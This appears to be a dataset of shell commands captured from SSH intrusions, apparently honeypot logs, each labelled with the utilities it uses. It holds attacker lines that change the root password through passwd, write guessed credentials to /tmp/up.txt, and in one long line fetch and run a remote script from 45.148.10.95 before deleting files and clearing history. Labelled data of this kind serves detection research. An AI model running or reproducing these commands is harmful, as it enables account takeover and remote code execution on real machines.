message
" cat /proc/cpuinfo | grep name | wc -l,Used utilities:
cat grep wc<|endoftext|>"
" echo -e  admin1234 nSE9R5TKdKDUo nSE9R5TKdKDUo |passwd|bash,Used utilities:
echo passwd bash<|endoftext|>"
" echo  admin1234 nSE9R5TKdKDUo nSE9R5TKdKDUo n |passwd,Used utilities:
echo passwd<|endoftext|>"
" echo  321  > /var/tmp/.var03522123,Used utilities:
echo<|endoftext|>"
" rm -rf /var/tmp/.var03522123,Used utilities:
rm<|endoftext|>"
" cat /var/tmp/.var03522123 | head -n 1,Used utilities:
cat head<|endoftext|>"
" cat /proc/cpuinfo | grep name | head -n 1 | awk '',Used utilities:
cat grep head awk<|endoftext|>"
" free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}',Used utilities:
free grep awk<|endoftext|>"
" ls -lh |which ls),Used utilities:
ls which<|endoftext|>"
" crontab -l,Used utilities:
crontab<|endoftext|>"
" w,Used utilities:
w<|endoftext|>"
" uname -m,Used utilities:
uname<|endoftext|>"
" cat /proc/cpuinfo | grep model | grep name | wc -l,Used utilities:
cat grep grep wc<|endoftext|>"
" top,Used utilities:
top<|endoftext|>"
" uname,Used utilities:
uname<|endoftext|>"
" uname -a,Used utilities:
uname<|endoftext|>"
" lscpu | grep Model,Used utilities:
lscpu grep<|endoftext|>"
" echo  admin admin1234  > /tmp/up.txt,Used utilities:
echo<|endoftext|>"
" rm -rf /var/tmp/dota*,Used utilities:
rm<|endoftext|>"
" echo -e  1 nSPVgPWvGJE0M nSPVgPWvGJE0M |passwd|bash,Used utilities:
echo passwd bash<|endoftext|>"
" echo  1 nSPVgPWvGJE0M nSPVgPWvGJE0M n |passwd,Used utilities:
echo passwd<|endoftext|>"
" echo  admin 1  > /tmp/up.txt,Used utilities:
echo<|endoftext|>"
" echo -e  admin1 noum6xhLEjG3A noum6xhLEjG3A |passwd|bash,Used utilities:
echo passwd bash<|endoftext|>"
" echo  admin1 noum6xhLEjG3A noum6xhLEjG3A n |passwd,Used utilities:
echo passwd<|endoftext|>"
" echo  admin admin1  > /tmp/up.txt,Used utilities:
echo<|endoftext|>"
" echo -e  12345 nZCs2sMT543ah nZCs2sMT543ah |passwd|bash,Used utilities:
echo passwd bash<|endoftext|>"
" echo  12345 nZCs2sMT543ah nZCs2sMT543ah n |passwd,Used utilities:
echo passwd<|endoftext|>"
" echo  admin 12345  > /tmp/up.txt,Used utilities:
echo<|endoftext|>"
" echo -e  pass n4Ia5s6FAqBhq n4Ia5s6FAqBhq |passwd|bash,Used utilities:
echo passwd bash<|endoftext|>"
" echo  pass n4Ia5s6FAqBhq n4Ia5s6FAqBhq n |passwd,Used utilities:
echo passwd<|endoftext|>"
" echo  admin pass  > /tmp/up.txt,Used utilities:
echo<|endoftext|>"
" echo -e  7 n2Q6ZaEazoyjY n2Q6ZaEazoyjY |passwd|bash,Used utilities:
echo passwd bash<|endoftext|>"
" echo  7 n2Q6ZaEazoyjY n2Q6ZaEazoyjY n |passwd,Used utilities:
echo passwd<|endoftext|>"
" echo  admin 7  > /tmp/up.txt,Used utilities:
echo<|endoftext|>"
" echo -e  1234 nwZjHPb9yRSeO nwZjHPb9yRSeO |passwd|bash,Used utilities:
echo passwd bash<|endoftext|>"
" echo  1234 nwZjHPb9yRSeO nwZjHPb9yRSeO n |passwd,Used utilities:
echo passwd<|endoftext|>"
" echo  admin 1234  > /tmp/up.txt,Used utilities:
echo<|endoftext|>"
" echo -e  7 nI2c4S6lfQbDS nI2c4S6lfQbDS |passwd|bash,Used utilities:
echo passwd bash<|endoftext|>"
" echo  7 nI2c4S6lfQbDS nI2c4S6lfQbDS n |passwd,Used utilities:
echo passwd<|endoftext|>"
" echo -e  pass n3Gh1bl21MgNL n3Gh1bl21MgNL |passwd|bash,Used utilities:
echo passwd bash<|endoftext|>"
" echo  pass n3Gh1bl21MgNL n3Gh1bl21MgNL n |passwd,Used utilities:
echo passwd<|endoftext|>"
" echo -e  7 n3Gh1bl21MgNL n3Gh1bl21MgNL |passwd|bash,Used utilities:
echo passwd bash<|endoftext|>"
" echo  7 n3Gh1bl21MgNL n3Gh1bl21MgNL n |passwd,Used utilities:
echo passwd<|endoftext|>"
" echo -e  1qaz2wsx nflwF6aU3xaFs nflwF6aU3xaFs |passwd|bash,Used utilities:
echo passwd bash<|endoftext|>"
" echo  1qaz2wsx nflwF6aU3xaFs nflwF6aU3xaFs n |passwd,Used utilities:
echo passwd<|endoftext|>"
" echo  admin 1qaz2wsx  > /tmp/up.txt,Used utilities:
echo<|endoftext|>"
" echo -e  123123 nsA4V5TefJUDj nsA4V5TefJUDj |passwd|bash,Used utilities:
echo passwd bash<|endoftext|>"
" echo  123123 nsA4V5TefJUDj nsA4V5TefJUDj n |passwd,Used utilities:
echo passwd<|endoftext|>"
" echo  admin 123123  > /tmp/up.txt,Used utilities:
echo<|endoftext|>"
" echo -e  7890 nxYYPRmJ2DSQM nxYYPRmJ2DSQM |passwd|bash,Used utilities:
echo passwd bash<|endoftext|>"
" echo  7890 nxYYPRmJ2DSQM nxYYPRmJ2DSQM n |passwd,Used utilities:
echo passwd<|endoftext|>"
" echo  admin 7890  > /tmp/up.txt,Used utilities:
echo<|endoftext|>"
" echo -e  78 n8g3eg4rIKS7h n8g3eg4rIKS7h |passwd|bash,Used utilities:
echo passwd bash<|endoftext|>"
" echo  78 n8g3eg4rIKS7h n8g3eg4rIKS7h n |passwd,Used utilities:
echo passwd<|endoftext|>"
" echo  admin 78  > /tmp/up.txt,Used utilities:
echo<|endoftext|>"
" echo -e  1234 njstcwVJYBykc njstcwVJYBykc |passwd|bash,Used utilities:
echo passwd bash<|endoftext|>"
" echo  1234 njstcwVJYBykc njstcwVJYBykc n |passwd,Used utilities:
echo passwd<|endoftext|>"
" echo -e  pass123 ngxsPovU14s8Q ngxsPovU14s8Q |passwd|bash,Used utilities:
echo passwd bash<|endoftext|>"
" echo  pass123 ngxsPovU14s8Q ngxsPovU14s8Q n |passwd,Used utilities:
echo passwd<|endoftext|>"
" echo  admin pass123  > /tmp/up.txt,Used utilities:
echo<|endoftext|>"
" cat /etc/issue| cd /tmp || cd /var/run || cd /mnt || cd /root || cd /| wget -q http://45.148.10.95/kuma-ssh-update.sh| curl -O http://45.148.10.95/kuma-ssh-update.sh| chmod 777 kuma-ssh-update.sh| sh kuma-ssh-update.sh| tftp 45.148.10.95 -c get kuma-ssh-update.sh| chmod 777 kuma-ssh-update.sh| sh kuma-ssh-update.sh| tftp -r kuma-ssh-update2.sh -g 45.148.10.95| chmod 777 kuma-ssh-update2.sh| sh kuma-ssh-update2.sh| ftpget -v -u anonymous -p anonymous -P 21 45.148.10.95 kuma-ssh-update1.sh kuma-ssh-update1.sh| sh kuma-ssh-update1.sh| rm -rf kuma-ssh-update.sh kuma-ssh-update.sh kuma-ssh-update2.sh kuma-ssh-update1.sh| rm -rf *| history -c,Used utilities:
cat cd  cd  cd  cd  cd wget curl chmod sh tftp chmod sh tftp chmod sh ftpget sh rm rm history<|endoftext|>"
" echo -e  Admin@123 np3DZDzfd4aJ1 np3DZDzfd4aJ1 |passwd|bash,Used utilities:
echo passwd bash<|endoftext|>"
" echo  Admin@123 np3DZDzfd4aJ1 np3DZDzfd4aJ1 n |passwd,Used utilities:
echo passwd<|endoftext|>"
" echo  admin Admin@123  > /tmp/up.txt,Used utilities:
echo<|endoftext|>"
" echo -e  123 nZvZM4CaucIoM nZvZM4CaucIoM |passwd|bash,Used utilities:
echo passwd bash<|endoftext|>"
" echo  123 nZvZM4CaucIoM nZvZM4CaucIoM n |passwd,Used utilities:
echo passwd<|endoftext|>"
" echo  admin 123  > /tmp/up.txt,Used utilities:
echo<|endoftext|>"
" echo -e  admin1 nt4qqMQ47dSEZ nt4qqMQ47dSEZ |passwd|bash,Used utilities:
echo passwd bash<|endoftext|>"
" echo  admin1 nt4qqMQ47dSEZ nt4qqMQ47dSEZ n |passwd,Used utilities:
echo passwd<|endoftext|>"
" echo -e  admin123 nWsLB11XxH1HX nWsLB11XxH1HX |passwd|bash,Used utilities:
echo passwd bash<|endoftext|>"
" echo  admin123 nWsLB11XxH1HX nWsLB11XxH1HX n |passwd,Used utilities:
echo passwd<|endoftext|>"
" echo  admin admin123  > /tmp/up.txt,Used utilities:
echo<|endoftext|>"
" echo -e  admin@1234 n5qmdbDhd1S2a n5qmdbDhd1S2a |passwd|bash,Used utilities:
echo passwd bash<|endoftext|>"
" echo  admin@1234 n5qmdbDhd1S2a n5qmdbDhd1S2a n |passwd,Used utilities:
echo passwd<|endoftext|>"
" echo  admin admin@1234  > /tmp/up.txt,Used utilities:
echo<|endoftext|>"
" echo -e  admin n7RtoJRksxQds n7RtoJRksxQds |passwd|bash,Used utilities:
echo passwd bash<|endoftext|>"
" echo  admin n7RtoJRksxQds n7RtoJRksxQds n |passwd,Used utilities:
echo passwd<|endoftext|>"
" echo  admin admin  > /tmp/up.txt,Used utilities:
